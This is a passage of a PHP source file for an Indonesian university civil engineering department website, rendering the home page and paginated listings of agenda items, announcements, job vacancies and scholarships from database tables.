<?php
define('BASE_URL', (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . "/");

function tanggal_indo($tanggal){
	$bulan = array (
    1 =>'Januari',
        'Februari',
        'Maret',
        'April',
        'Mei',
        'Juni',
        'Juli',
        'Agustus',
        'September',
        'Oktober',
        'November',
        'Desember'
		);
	$split = explode('-', $tanggal);
	return substr($split[2],0,2) . ' ' . $bulan[ (int)$split[1] ] . ' ' . $split[0];
}

function time_elapsed_string($datetime) {
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);

    $units = array(
        "tahun" => $diff->y,
        "bulan" => $diff->m,
        "minggu" => floor($diff->d / 7),
        "hari" => $diff->d % 7,
        "jam" => $diff->h,
        "menit" => $diff->i,
        "detik" => $diff->s
    );

    foreach ($units as $key => $value) {
        if ($value > 0) {
            return $value . ' ' . $key . ($value > 1 ? ' yang lalu' : ' yang lalu');
        }
    }

    return 'baru saja';
}

function beranda(){

    $datenow = date('Y-m-d H:i:s');

    $data = new Data();

    $tbbanner = 'tb_banner';
    $fieldsbanner = ['IdBanner', 'FileBanner'];
    $orderbybanner = 'IdBanner DESC';
    $limitbanner = 5;
    $kondisibanner = ["Kode = '19'"];
    $databanner = $data->getDataFromTable($tbbanner, $fieldsbanner, $orderbybanner, $limitbanner, $kondisibanner);

    $tbinformasi = 'tb_informasi';
    $fieldsinformasi1 = null;
    $orderbyinformasi = 'KategoriInformasi DESC, IdInformasi DESC';
    $distinctinformasi1 = "KategoriInformasi";
    $limitinformasi = null;
    $kondisiinformasi1 = ["Kode = '19'","KategoriInformasi <> 'Agenda'"];
    $datainformasi1 = $data->getDataFromTable($tbinformasi, $fieldsinformasi1, $orderbyinformasi, $limitinformasi, $kondisiinformasi1, $distinctinformasi1);

    $tbberita = 'tb_berita';
    $fieldsberita = ['NamaBerita', 'KeteranganBerita', 'PenulisBerita', 'TanggalBerita', 'MenuBerita', 'FotoBerita', 'URL'];
    $orderbyberita = 'TanggalBerita DESC, IdBerita DESC';
    $limitberita = 2;
    $kondisiberita = ["Kode = '19'"];
    $databerita = $data->getDataFromTable($tbberita, $fieldsberita, $orderbyberita, $limitberita, $kondisiberita);

    $tblink = 'tb_link_youtube';
    $fieldslink = ['IdLink', 'Link'];
    $orderbylink = 'IdLink DESC';
    $limitlink = 1;
    $kondisilink = ["Kode = '19'"];
    $datalinkyoutube = $data->getDataFromTable($tblink, $fieldslink, $orderbylink, $limitlink, $kondisilink);


    echo '
    <section>
        <div id="carousel-example-2" class="carousel slide carousel-fade" data-ride="carousel">
            <ol class="carousel-indicators">';
            
    foreach ($databanner as $nods => $banner):
        $actb1 = ($nods == 0) ? ' class="active"' : '';
        echo '
                <li data-target="#carousel-example-2" data-slide-to="' . $nods . '"' . $actb1 . '></li>';
    endforeach;
    echo '
            </ol>
            <div class="carousel-inner" role="listbox">';
            
    foreach ($databanner as $nods => $banner):
        $actb2 = ($nods == 0) ? ' active' : '';
        echo '
                <div class="carousel-item' . $actb2 . '">
                    <div class="view">
                        <img class="d-block w-100" src="' . BASE_URL . 'img/slider/' . $banner["FileBanner"] . '" alt="" loading="lazy">
                        <div class="mask rgba-black-slight"></div>
                    </div>
                </div>';
    endforeach;
    echo '
            </div>
            <a class="carousel-control-prev" href="#carousel-example-2" role="button" data-slide="prev">
                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                <span class="sr-only">Previous</span>
            </a>
            <a class="carousel-control-next" href="#carousel-example-2" role="button" data-slide="next">
                <span class="carousel-control-next-icon" aria-hidden="true"></span>
                <span class="sr-only">Next</span>
            </a>
        </div>
    </section>

    <section class="bg-blue">
        <div class="container">
            <div class="row pt-5 pb-5">
                <div class="col-md-6">
                    <div class="card-body text-white">
                        <h3 class="card-title text-uppercase mb-1">Penerimaan Mahasiswa Baru</h3>
                        <p class="card-text"><em>Tahun Akademik 2024/2025.</em></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="card-body text-white text-right">
                        <button type="button" onclick="window.open(\'https://sbmptmsulawesi.id/\')" class="btn btn-outline-light btn-rounded waves-effect"><i class="fa fa-chevron-right"></i> Selengkapnya...</button>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="headnav-2">
        <div class="container">
            <div class="row pt-5 pb-5">
                <div class="col-md-6 pb-3">
                    <div class="accordion md-accordion" id="accordionEx" role="tablist" aria-multiselectable="true">';
                    $nomrnya=1;
                    $tampil = ' show';
                    $collapse = '';
                    $iconup = 'true';
                    foreach ($datainformasi1 as $row1):
                        $kateg = htmlspecialchars($row1["KategoriInformasi"]);
                    echo'
                        <div class="card headnav-1">
                            <div class="card-header" role="tab" id="heading'.$nomrnya.'">
                                <a'.$collapse.' data-toggle="collapse" data-toggle="collapse" data-parent="#accordionEx" href="#collapse'.$nomrnya.'" aria-expanded="'.$iconup.'" aria-controls="collapse'.$nomrnya.'">
                                    <h6 class="mb-0 h6 headnav-1 text-white text-uppercase text-center">
                                        '.strtoupper($kateg).' <i class="fa fa-angle-down rotate-icon"></i>
                                    </h6>
                                </a>
                            </div>
                            <div id="collapse'.$nomrnya.'" class="collapse'.$tampil.'" role="tabpanel" aria-labelledby="heading'.$nomrnya.'"
                                data-parent="#accordionEx">
                                <div class="card">
                                    <ul class="list-group list-group-flush">';
                                        $fieldsinformasi2 = ['KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'URL'];
                                        $distinctinformasi2 = null;
                                        $limitinformasi2 = 3;
                                        $kondisiinformasi2 = ["KategoriInformasi = '$kateg'", "Kode = '19'"];
                                        $datainformasi2 = $data->getDataFromTable($tbinformasi, $fieldsinformasi2, $orderbyinformasi, $limitinformasi2, $kondisiinformasi2, $distinctinformasi2);
                                        foreach ($datainformasi2 as $row2):
                                            $kateginfo = htmlspecialchars($row2["KategoriInformasi"]);
                                            $jdlinfo = htmlspecialchars($row2["JudulInformasi"]);
                                            $tglinfo = htmlspecialchars($row2["TanggalInformasi"]);
                                            $urlinfo = htmlspecialchars($row2["URL"]);
                                            if($tglinfo <= $datenow){
                                        echo'
                                        <li class="list-group-item pt-2 pb-2">
                                            <a href="'.BASE_URL.strtolower($kateginfo).'/'.substr($tglinfo,0,4).'/'.$urlinfo.'">
                                            <img src="'.BASE_URL.'img/'.strtolower($kateginfo).'.png" class="rounded float-left mr-2" style="width: 50px;" alt="" loading="lazy">
                                            <div class="row">
                                                <p class="mb-0 w-100">'.$jdlinfo.'</p>
                                                <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tglinfo).'<br><i class="fa fa-clock-o"></i> '.time_elapsed_string($tglinfo).'</small>
                                            </div>
                                            </a>
                                        </li>';
                                            }
                                        endforeach;
                                    echo'
                                    </ul>
                                    <div class="card-footer text-right text-uppercase text-muted small">
                                        <a href="'.BASE_URL.strtolower($kateginfo).'"><i class="fa fa-chevron-right"></i> Selengkapnya...</a>
                                    </div>
                                </div>
                            </div>
                        </div>';
                        $nomrnya++;
                        $tampil='';
                        $collapse=' class="collapsed"';
                        $iconup="false";
                    endforeach;
                    echo'
                    </div>                    
                </div>
                <div class="col-md-6 pb-3">
                    <div class="card">
                        <div class="card-header h6 headnav-1 text-white text-uppercase text-center">
                            Agenda
                        </div>';
                        $fieldsagenda = ['KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'URL'];
                        $distinctagenda = null;
                        $limitagenda = 5;
                        $kondisiagenda = ["Kode = '19'","KategoriInformasi = 'Agenda'"];
                        $dataagenda = $data->getDataFromTable($tbinformasi, $fieldsagenda, $orderbyinformasi, $limitagenda, $kondisiagenda, $distinctagenda);
                        $rowCount = count($dataagenda);
                        if($rowCount == true){
                        echo'
                        <ul class="list-group list-group-flush">';
                        foreach ($dataagenda as $rowagen):
                            $kateginfoagen = htmlspecialchars($rowagen["KategoriInformasi"]);
                            $jdlinfoagen = htmlspecialchars($rowagen["JudulInformasi"]);
                            $tglinfoagen = htmlspecialchars($rowagen["TanggalInformasi"]);
                            $urlinfoagen = htmlspecialchars($rowagen["URL"]);
                            if($tglinfoagen <= $datenow){
                        echo'
                        <li class="list-group-item pt-2 pb-2">
                            <a href="'.BASE_URL.strtolower($kateginfoagen).'/'.substr($tglinfoagen,0,4).'/'.$urlinfoagen.'">
                            <img src="'.BASE_URL.'img/'.strtolower($kateginfoagen).'.png" class="rounded float-left mr-2" style="width: 50px;" alt="" loading="lazy">
                            <div class="row">
                                <p class="mb-0 w-100">'.$jdlinfoagen.'</p>
                                <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tglinfoagen).'<br><i class="fa fa-clock-o"></i> '.time_elapsed_string($tglinfoagen).'</small>
                            </div>
                            </a>
                        </li>';
                            }
                        endforeach;
                    echo'
                        </ul>
                        <div class="card-footer text-right text-uppercase text-muted small">
                            <a href="'.BASE_URL.strtolower($kateginfoagen).'"><i class="fa fa-chevron-right"></i> Selengkapnya...</a>
                        </div>';
                        } else {
                    echo'
                        <p class="text-center mt-2"> Belum Ada Agenda </p>';
                        }
                    echo'
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="bg-batik">
        <div class="container py-4">
            <div class="responsive1 slider">';
                foreach ($databerita as $row):
                    $nmber = htmlspecialchars($row["NamaBerita"]);
                    $ketber = $row["KeteranganBerita"];
                    $max_length = 250;
                    if (strlen($ketber) > $max_length) {
                        $last_space = strrpos(substr($ketber, 0, $max_length), ' ');
                        $ketber = substr($ketber, 0, $last_space);
                    }
                    $tulber = htmlspecialchars($row["PenulisBerita"]);
                    $tglber = htmlspecialchars($row["TanggalBerita"]);
                    $menber = htmlspecialchars($row["MenuBerita"]);
                    $badgeClass = "";
                    switch ($menber) {
                        case "Kemahasiswaan":
                            $badgeClass = "badge-secondary";
                            break;
                        case "Kemuhammadiyahan":
                            $badgeClass = "badge-success";
                            break;
                        case "Kerjasama":
                            $badgeClass = "badge-danger";
                            break;
                        case "Prestasi":
                            $badgeClass = "badge-warning";
                            break;
                        case "Tri Dharma":
                            $badgeClass = "badge-primary";
                            break;
                        default:
                            $badgeClass = "";
                            break;
                    }
                    $fotber = $row["FotoBerita"];
                    $urlber = htmlspecialchars($row["URL"]);
                    if($tglber <= $datenow){
                    echo'
                    <div class="items">
                        <div class="row">
                            <div class="col-md-6 text-right">
                                <p class="mb-5 judulred">Berita Terkini</p>
                                <div class="car-text my-5">
                                    <p class="small mb-1"><i class="fa fa-calendar pink-text"></i> <span class="pink-text">' . tanggal_indo($tglber) . '</span> | <i class="fa fa-edit pink-text"></i> <span class="pink-text">' . $tulber . '</span></p>';
                                    if (!empty($badgeClass)):
                                        echo'
                                        <p><span class="badge ' . $badgeClass . ' text-uppercase">' . $menber . '</span></p>';
                                    endif;
                                    echo'
                                    <h5>' . $nmber . '</h5>
                                    <p class="text-justify my-4">' . $ketber . '... <a href="' . BASE_URL . str_replace(' ','_',strtolower($menber)) . "/" . substr($tglber,0,4) . "/" . $urlber.'">Selengkapnya <i class="fa fa-angle-double-right"></i></a></p>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <img src="' . BASE_URL . '/img/berita/' . $fotber . '" class="img-fluid img-thumbnail rounded-lg" alt="" loading="lazy">
                            </div>
                        </div>
                    </div>';
                    }
                endforeach;
            echo'
            </div>
            <div class="text-center">
                <a href="' . BASE_URL . 'berita_program_studi" type="button" class="btn btn-warning">Berita Lainnya...</a>
            </div>
        </div>
    </section>

    <section class="headnav-2 darken-4">
        <div class="container py-4">
            <div class="row text-white">
                <div class="col-md-6">
                    <div class="embed-responsive embed-responsive-16by9 mb-3">';
                    foreach ($datalinkyoutube as $row){
                        echo $row["Link"];
                    }
                    echo'
                    </div>
                </div>
                <div class="col-md-6">
                    <h4 class="text-uppercase mb-4">Program Studi Teknik Sipil</h4>
                    <p class="text-justify">Program Studi Teknik Sipil, Fakultas Teknik, Universitas Muhammadiyah Parepare (PSTS FT-UMPAR) merupakan salah satu program studi yang sudah ada sejak awal berdirinya Universitas Muhammadiyah Parepare (UMPAR) pada tanggal 10 Mei 1999 M bertepatan dengan tanggal 24 Muharram 1420 H berdasarkan Surat Keputusan Menteri Pendidikan dan Kebudayaan Republik Indonesia (MENDIKBUD-RI) Nomor 86/D/O/1999 tanggal 10 Mei 1999 di bawah pengelolaan Fakultas Teknik...
                    </p>
                    <a href="" type="button" class="btn btn-light btn-sm float-right">Selengkapnya <i class="fa fa-angle-double-right"></i></a>
                </div>
            </div>
        </div>
    </section>

    <section class="bg-merah">
        <div class="container py-5">
            <div class="row">
                <div class="col-md-12 pb-5 text-center">
                    <p class="mb-5 judulwhite">Temukan & Ikuti Kami</p>
                </div>
                <div class="col-md-12 text-center">
                    <div class="wrapper img-fluid">
                        <a href="https://www.facebook.com/tekniksipilumpar1/" target="_blank" style="color: black;">
                            <div class="icon facebook">
                                <div class="tooltip">
                                Facebook
                                </div>
                                <span><i class="fa fa-facebook"></i></span>
                            </div>
                        </a>
                        <a href="https://www.instagram.com/tekniksipilumpar/" target="_blank" style="color: black;">
                            <div class="icon instagram">
                                <div class="tooltip">
                                Instagram
                                </div>
                                <span><i class="fa fa-instagram"></i></span>
                            </div>
                        </a>
                        <a href="https://api.whatsapp.com/send?phone=6285255853465&text=السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ" target="_blank" style="color: black;">
                            <div class="icon whatsapp">
                                <div class="tooltip">
                                WhatsApp
                                </div>
                                <span><i class="fa fa-whatsapp"></i></span>
                            </div>
                        </a>
                        <a href="https://www.youtube.com/@tekniksipilumpar" target="_blank" style="color: black;">
                            <div class="icon youtube">
                                <div class="tooltip">
                                Youtube
                                </div>
                                <span><i class="fa fa-youtube-play"></i></span>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </section>';
}

function agenda(){

    $datenow = date('Y-m-d H:i:s');

    $data = new Data();

    $tbpageinfo = 'tb_informasi';
    $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Agenda'"];
    $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
    $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
    $limitpage = 6;
    $datapage = $data->getDataFromTablePage($tbpageinfo, $fieldspage, $kondisipage, $orderBypage, $pagepage, $limitpage);

    $fieldsinfo = null;
    $distinctinfo = "KategoriInformasi";
    $limitinfo = null;
    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Agenda'"];
    $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="row">
                <div class="col-md-9 mb-4">
                    <div class="text-center">
                        <p class="mb-5 judulred">Agenda</p>
                    </div>
                    <ul class="list-group text-left mb-4">';
                    foreach ($datapage as $rowpage):
                        $idinfo = htmlspecialchars($rowpage["IdInformasi"]);
                        $kateginfo = htmlspecialchars($rowpage["KategoriInformasi"]);
                        $jdlinfo = htmlspecialchars($rowpage["JudulInformasi"]);
                        $tglinfo = htmlspecialchars($rowpage["TanggalInformasi"]);
                        $urlinfo = htmlspecialchars($rowpage["URL"]);
                        if($tglinfo <= $datenow){
                    echo'
                    <li class="list-group-item pt-2 pb-2">
                        <a href="'.BASE_URL.strtolower($kateginfo).'/'.substr($tglinfo,0,4).'/'.$urlinfo.'">
                        <img src="'.BASE_URL.'img/'.strtolower($kateginfo).'.png" class="rounded float-left mr-2" style="width: 50px;" alt="" loading="lazy">
                        <div class="row">
                            <p class="mb-0 w-100">'.$jdlinfo.'</p>
                            <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tglinfo).'<br><i class="fa fa-clock-o"></i> '.time_elapsed_string($tglinfo).'</small>
                        </div>
                        </a>
                    </li>';
                        }
                    endforeach;
                echo'
                    </ul>';
                    $kodearr = [
                        "Kode = '19'",
                        "KategoriInformasi = 'Agenda'"
                    ];
                    $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
                    $baseURL = BASE_URL . 'agenda/';
                    $get_jumlah = 'IdInformasi';
                    $paginationHtml = $data->generatePagination($pagepage, $limitpage, $kodearr, $selectQuery, $baseURL, $get_jumlah);
                    echo $paginationHtml;
                echo'
                </div>
                <div class="col-md-3">';
                foreach ($datainfo as $rowinfo):
                    $kateg = htmlspecialchars($rowinfo["KategoriInformasi"]);
                    echo'
                    <div class="card mb-3">
                        <div class="card-header h5 headnav-1 text-white text-center">
                            '.$kateg.'
                        </div>
                        <ul class="list-group text-left">';
                        $distinctinfonya = null;
                        $limitinfonya = 5;
                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
                        $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                        if (!empty($datainfonya)){
                        foreach ($datainfonya as $row2):
                            $kateg = htmlspecialchars($row2["KategoriInformasi"]);
                            $jdl = htmlspecialchars($row2["JudulInformasi"]);
                            $tgl = htmlspecialchars($row2["TanggalInformasi"]);
                            $url = htmlspecialchars($row2["URL"]);
                            if($tgl <= $datenow){
                        echo'
                            <li class="list-group-item pt-2 pb-2">
                                <a href="'.BASE_URL.strtolower($kateg).'/'.substr($tgl,0,4).'/'.$url.'"><p class="mb-0 w-100 small">'.$jdl.'</p></a>
                                <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tgl).'</small>
                            </li>';
                            }
                        endforeach;
                        }else{
                            echo'
                            <li class="list-group-item pt-2 pb-2 mt-3">
                                <p class="text-center">Belum ada Agenda</p>
                            </li>';
                        }
                        echo'
                        </ul>
                        <div class="card-footer text-center text-uppercase text-muted small">
                            <a href="'.BASE_URL.strtolower($kateg).'"><i class="fa fa-chevron-right"></i> Selengkapnya...</a>
                        </div>
                    </div>';
                endforeach;
                echo'
                </div>
            </div>
        </div>
    </section>';

}

function pengumuman(){

    $datenow = date('Y-m-d H:i:s');

    $data = new Data();

    $tbpageinfo = 'tb_informasi';
    $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Pengumuman'"];
    $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
    $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
    $limitpage = 6;
    $datapage = $data->getDataFromTablePage($tbpageinfo, $fieldspage, $kondisipage, $orderBypage, $pagepage, $limitpage);

    $fieldsinfo = null;
    $distinctinfo = "KategoriInformasi";
    $limitinfo = null;
    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Pengumuman'"];
    $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="row">
                <div class="col-md-9 mb-4">
                    <div class="text-center">
                        <p class="mb-5 judulred">Pengumuman</p>
                    </div>
                    <ul class="list-group text-left mb-4">';
                    foreach ($datapage as $rowpage):
                        $idinfo = htmlspecialchars($rowpage["IdInformasi"]);
                        $kateginfo = htmlspecialchars($rowpage["KategoriInformasi"]);
                        $jdlinfo = htmlspecialchars($rowpage["JudulInformasi"]);
                        $tglinfo = htmlspecialchars($rowpage["TanggalInformasi"]);
                        $urlinfo = htmlspecialchars($rowpage["URL"]);
                        if($tglinfo <= $datenow){
                    echo'
                    <li class="list-group-item pt-2 pb-2">
                        <a href="'.BASE_URL.strtolower($kateginfo).'/'.substr($tglinfo,0,4).'/'.$urlinfo.'">
                        <img src="'.BASE_URL.'img/'.strtolower($kateginfo).'.png" class="rounded float-left mr-2" style="width: 50px;" alt="" loading="lazy">
                        <div class="row">
                            <p class="mb-0 w-100">'.$jdlinfo.'</p>
                            <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tglinfo).'<br><i class="fa fa-clock-o"></i> '.time_elapsed_string($tglinfo).'</small>
                        </div>
                        </a>
                    </li>';
                        }
                    endforeach;
                echo'
                    </ul>';
                    $kodearr = [
                        "Kode = '19'",
                        "KategoriInformasi = 'Pengumuman'"
                    ];
                    $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
                    $baseURL = BASE_URL . 'pengumuman/';
                    $get_jumlah = 'IdInformasi';
                    $paginationHtml = $data->generatePagination($pagepage, $limitpage, $kodearr, $selectQuery, $baseURL, $get_jumlah);
                    echo $paginationHtml;
                echo'
                </div>
                <div class="col-md-3">';
                foreach ($datainfo as $rowinfo):
                    $kateg = htmlspecialchars($rowinfo["KategoriInformasi"]);
                    echo'
                    <div class="card mb-3">
                        <div class="card-header h5 headnav-1 text-white text-center">
                            '.$kateg.'
                        </div>
                        <ul class="list-group text-left">';
                        $distinctinfonya = null;
                        $limitinfonya = 5;
                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
                        $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                        if (!empty($datainfonya)){
                        foreach ($datainfonya as $row2):
                            $kateg = htmlspecialchars($row2["KategoriInformasi"]);
                            $jdl = htmlspecialchars($row2["JudulInformasi"]);
                            $tgl = htmlspecialchars($row2["TanggalInformasi"]);
                            $url = htmlspecialchars($row2["URL"]);
                            if($tgl <= $datenow){
                        echo'
                            <li class="list-group-item pt-2 pb-2">
                                <a href="'.BASE_URL.strtolower($kateg).'/'.substr($tgl,0,4).'/'.$url.'"><p class="mb-0 w-100 small">'.$jdl.'</p></a>
                                <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tgl).'</small>
                            </li>';
                            }
                        endforeach;
                        }else{
                            echo'
                            <li class="list-group-item pt-2 pb-2 mt-3">
                                <p class="text-center">Belum ada Pengumuman</p>
                            </li>';
                        }
                        echo'
                        </ul>
                        <div class="card-footer text-center text-uppercase text-muted small">
                            <a href="'.BASE_URL.strtolower($kateg).'"><i class="fa fa-chevron-right"></i> Selengkapnya...</a>
                        </div>
                    </div>';
                endforeach;
                echo'
                </div>
            </div>
        </div>
    </section>';

}

function lowongan(){

    $datenow = date('Y-m-d H:i:s');

    $data = new Data();

    $tbpageinfo = 'tb_informasi';
    $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Lowongan'"];
    $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
    $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
    $limitpage = 6;
    $datapage = $data->getDataFromTablePage($tbpageinfo, $fieldspage, $kondisipage, $orderBypage, $pagepage, $limitpage);

    $fieldsinfo = null;
    $distinctinfo = "KategoriInformasi";
    $limitinfo = null;
    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Lowongan'"];
    $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="row">
                <div class="col-md-9 mb-4">
                    <div class="text-center">
                        <p class="mb-5 judulred">Lowongan</p>
                    </div>
                    <ul class="list-group text-left mb-4">';
                    foreach ($datapage as $rowpage):
                        $idinfo = htmlspecialchars($rowpage["IdInformasi"]);
                        $kateginfo = htmlspecialchars($rowpage["KategoriInformasi"]);
                        $jdlinfo = htmlspecialchars($rowpage["JudulInformasi"]);
                        $tglinfo = htmlspecialchars($rowpage["TanggalInformasi"]);
                        $urlinfo = htmlspecialchars($rowpage["URL"]);
                        if($tglinfo <= $datenow){
                    echo'
                    <li class="list-group-item pt-2 pb-2">
                        <a href="'.BASE_URL.strtolower($kateginfo).'/'.substr($tglinfo,0,4).'/'.$urlinfo.'">
                        <img src="'.BASE_URL.'img/'.strtolower($kateginfo).'.png" class="rounded float-left mr-2" style="width: 50px;" alt="" loading="lazy">
                        <div class="row">
                            <p class="mb-0 w-100">'.$jdlinfo.'</p>
                            <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tglinfo).'<br><i class="fa fa-clock-o"></i> '.time_elapsed_string($tglinfo).'</small>
                        </div>
                        </a>
                    </li>';
                        }
                    endforeach;
                echo'
                    </ul>';
                    $kodearr = [
                        "Kode = '19'",
                        "KategoriInformasi = 'Lowongan'"
                    ];
                    $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
                    $baseURL = BASE_URL . 'lowongan/';
                    $get_jumlah = 'IdInformasi';
                    $paginationHtml = $data->generatePagination($pagepage, $limitpage, $kodearr, $selectQuery, $baseURL, $get_jumlah);
                    echo $paginationHtml;
                echo'
                </div>
                <div class="col-md-3">';
                foreach ($datainfo as $rowinfo):
                    $kateg = htmlspecialchars($rowinfo["KategoriInformasi"]);
                    echo'
                    <div class="card mb-3">
                        <div class="card-header h5 headnav-1 text-white text-center">
                            '.$kateg.'
                        </div>
                        <ul class="list-group text-left">';
                        $distinctinfonya = null;
                        $limitinfonya = 5;
                        $kondisiinfonya = ["Kode = '19'","KategoriInformasi = '$kateg'"];
                        $datainfonya = $data->getDataFromTable($tbpageinfo, $fieldspage, $orderBypage, $limitinfonya, $kondisiinfonya, $distinctinfonya);
                        if (!empty($datainfonya)){
                        foreach ($datainfonya as $row2):
                            $kateg = htmlspecialchars($row2["KategoriInformasi"]);
                            $jdl = htmlspecialchars($row2["JudulInformasi"]);
                            $tgl = htmlspecialchars($row2["TanggalInformasi"]);
                            $url = htmlspecialchars($row2["URL"]);
                            if($tgl <= $datenow){
                        echo'
                            <li class="list-group-item pt-2 pb-2">
                                <a href="'.BASE_URL.strtolower($kateg).'/'.substr($tgl,0,4).'/'.$url.'"><p class="mb-0 w-100 small">'.$jdl.'</p></a>
                                <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tgl).'</small>
                            </li>';
                            }
                        endforeach;
                        }else{
                            echo'
                            <li class="list-group-item pt-2 pb-2 mt-3">
                                <p class="text-center">Belum ada Lowongan</p>
                            </li>';
                        }
                        echo'
                        </ul>
                        <div class="card-footer text-center text-uppercase text-muted small">
                            <a href="'.BASE_URL.strtolower($kateg).'"><i class="fa fa-chevron-right"></i> Selengkapnya...</a>
                        </div>
                    </div>';
                endforeach;
                echo'
                </div>
            </div>
        </div>
    </section>';

}

function beasiswa(){

    $datenow = date('Y-m-d H:i:s');

    $data = new Data();

    $tbpageinfo = 'tb_informasi';
    $fieldspage = ['IdInformasi', 'KategoriInformasi', 'JudulInformasi', 'TanggalInformasi', 'GambarInformasi', 'URL'];
    $kondisipage = ["Kode = '19'", "KategoriInformasi = 'Beasiswa'"];
    $orderBypage = 'TanggalInformasi DESC, IdInformasi DESC';
    $pagepage = (isset($_GET['kode'])) ? $_GET['kode'] : 1;
    $limitpage = 6;
    $datapage = $data->getDataFromTablePage($tbpageinfo, $fieldspage, $kondisipage, $orderBypage, $pagepage, $limitpage);

    $fieldsinfo = null;
    $distinctinfo = "KategoriInformasi";
    $limitinfo = null;
    $kondisiinfo = ["Kode = '19'", "KategoriInformasi <> 'Beasiswa'"];
    $datainfo = $data->getDataFromTable($tbpageinfo, $fieldsinfo, $orderBypage, $limitinfo, $kondisiinfo, $distinctinfo);

    echo'
    <section class="bg-batik">
        <div class="container py-4">
            <div class="row">
                <div class="col-md-9 mb-4">
                    <div class="text-center">
                        <p class="mb-5 judulred">Beasiswa</p>
                    </div>
                    <ul class="list-group text-left mb-4">';
                    foreach ($datapage as $rowpage):
                        $idinfo = htmlspecialchars($rowpage["IdInformasi"]);
                        $kateginfo = htmlspecialchars($rowpage["KategoriInformasi"]);
                        $jdlinfo = htmlspecialchars($rowpage["JudulInformasi"]);
                        $tglinfo = htmlspecialchars($rowpage["TanggalInformasi"]);
                        $urlinfo = htmlspecialchars($rowpage["URL"]);
                        if($tglinfo <= $datenow){
                    echo'
                    <li class="list-group-item pt-2 pb-2">
                        <a href="'.BASE_URL.strtolower($kateginfo).'/'.substr($tglinfo,0,4).'/'.$urlinfo.'">
                        <img src="'.BASE_URL.'img/'.strtolower($kateginfo).'.png" class="rounded float-left mr-2" style="width: 50px;" alt="" loading="lazy">
                        <div class="row">
                            <p class="mb-0 w-100">'.$jdlinfo.'</p>
                            <small class="text-muted"><i class="fa fa-calendar"></i> '.tanggal_indo($tglinfo).'<br><i class="fa fa-clock-o"></i> '.time_elapsed_string($tglinfo).'</small>
                        </div>
                        </a>
                    </li>';
                        }
                    endforeach;
                echo'
                    </ul>';
                    $kodearr = [
                        "Kode = '19'",
                        "KategoriInformasi = 'Beasiswa'"
                    ];
                    $selectQuery = "SELECT COUNT(*) AS IdInformasi FROM tb_informasi WHERE " . implode(' AND ', $kodearr);
                    $baseURL = BASE_URL . 'beasiswa/';
                    $get_jumlah = 'IdInformasi';
                    $paginationHtml = $data->generatePagination($pagepage, $limitpage, $kodearr, $selectQuery, $baseURL, $get_jumlah);
                    echo $paginationHtml;
                echo'
                </div>
                <div class="col-md-3">';
                foreach ($datainfo as $rowinfo):
                    $kateg = htmlspecialchars($rowinfo["KategoriInformasi"]);
                    echo'
                    <div class="card mb-3">
                        <div class="card-header h5 headnav-1 text-white text-center">
                            '.$kateg.'
                        </div>
                        <ul class="list-group text-left">';
                        $distinctinfonya = null;
                        $limitinfonya = 5;
